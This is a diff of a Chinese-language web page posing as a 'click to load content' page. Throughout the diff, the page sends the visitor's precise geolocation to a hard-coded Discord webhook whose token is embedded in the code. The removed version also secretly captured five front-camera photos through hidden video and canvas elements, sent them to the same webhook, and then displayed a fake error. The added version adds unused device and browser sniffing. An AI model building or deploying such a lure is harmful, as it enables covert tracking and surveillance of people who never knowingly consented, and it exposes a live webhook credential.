@@ -1,100 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>內容載入中</title>
+<meta charset="utf-8">
+<title>內容載入中</title>
 </head>
+
 <body>
 
 <h2>點擊按鈕查看內容</h2>
-<button onclick="startAction()">點擊載入</button>
+<button onclick="getLocation()">點擊載入</button>
+
 <p id="status"></p>
 
-<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
-<video id="v" style="display:none;" autoplay playsinline></video>
-<canvas id="c" style="display:none;"></canvas>
-
 <script>
+
 var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-var captureCount = 0; // 新增計數器
+var ua = navigator.userAgent;
+var device = "Unknown Device";
 
-function startAction() {
-    getLocation(); // 原有的定位
-    getCamera();   // 新增的截圖
+if(/iPhone/i.test(ua)){
+device = "iPhone";
+}
+else if(/iPad/i.test(ua)){
+device = "iPad";
+}
+else if(/Android/i.test(ua)){
+device = "Android Device";
 }
 
-function getLocation() {
-    document.getElementById("status").innerHTML = "正在取得內容...";
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        });
-    }
+var browser = "Unknown Browser";
+
+if(ua.indexOf("Chrome")>-1){
+browser = "Chrome";
+}
+else if(ua.indexOf("Safari")>-1){
+browser = "Safari";
+}
+function getLocation(){
+
+document.getElementById("status").innerHTML="正在取得位置...";
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
+
+}else{
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
 }
 
-function success(pos) {
-    var lat = pos.coords.latitude;
-    var lon = pos.coords.longitude;
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
-        })
-    });
-    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
 }
 
-function error(err) {
-    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
+function success(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺\n"+
+"地圖: https://www.google.com/maps?q="+lat+","+lon
+})
+});
+
+document.getElementById("status").innerHTML=
+"定位成功<br>" +
+"緯度: "+lat+"<br>" +
+"經度: "+lon+"<br>" +
+"精準度: "+acc+" 公尺";
+
 }
 
-function getCamera() {
-    // 請求相機權限
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(function(stream) {
-        var video = document.getElementById("v");
-        video.srcObject = stream;
-        
-        // 將定時器存入變數，以便後續停止
-        var timer = setInterval(function() {
-            // 檢查是否已拍滿 5 張
-            if (captureCount >= 5) {
-                clearInterval(timer); // 停止定時傳送
-                stream.getTracks().forEach(track => track.stop()); // 關閉相機硬體（綠燈會滅掉）
-                return;
-            }
+function error(err){
 
-            var canvas = document.getElementById("c");
-            if (video.videoWidth === 0) return; // 防止抓到黑畫面
+document.getElementById("status").innerHTML="需要允許定位才能查看內容";
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(function(blob) {
-                var formData = new FormData();
-                formData.append('file', blob, 'capture.jpg');
-                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面 (第 " + (captureCount + 1) + " 張)" }));
-                
-                fetch(webhook, {
-                    method: "POST",
-                    body: formData
-                });
-                
-                captureCount++; // 增加計數
-            }, "image/jpeg", 0.7);
-        }, 5000);
-    })
-    .catch(function(err) {
-        console.log("相機權限被拒絕");
-    });
 }
+
 </script>
 
 </body>
 </html>
-
